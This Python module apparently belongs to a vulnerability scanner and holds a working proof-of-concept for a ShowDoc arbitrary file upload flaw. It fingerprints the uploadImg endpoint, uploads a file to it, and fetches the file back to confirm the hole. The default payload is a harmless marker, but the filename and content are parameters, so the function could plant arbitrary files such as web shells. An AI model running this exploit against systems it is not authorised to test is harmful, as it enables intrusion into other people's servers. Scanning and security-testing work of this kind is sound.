# -*- coding:utf-8 -*-
# ShowDoc 任意文件上传
import re

from .. import requestUtil
from ServiceScanModel.models import ServiceScan


def showdoc_poc(url, filename="passer.txt", filedata="passer-W", type="poc"):
    encoded_data = requestUtil.get_file_data(filename, filedata, "editormd-image-file")
    resp = requestUtil.post(url+"/index.php?s=/home/page/uploadImg", header={'Content-Type': encoded_data[1]}, data=encoded_data[0])
    if not "url" in resp.text:
        return False
    url = re.findall(r'"url":"(.*?)"', resp.text)[0].replace("\/", "/")
    if type == "poc":
        resp = requestUtil.get(url)
        if filedata in resp.text:
            return url
        else:
            return False
    else:
        return url


def fingerprint(service):
    try:
        if service.url:
            resp = requestUtil.get(service.url + "/index.php?s=/home/page/uploadImg")
            if "没有上传的文件" in resp.text:
                return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        result = showdoc_poc(service.url)
        print(result)
        if result:
            return ["ShowDoc 任意文件上传", "Path: %s<br>Content: passer-W" % result.replace(service.url, "")]
    except:
        return []
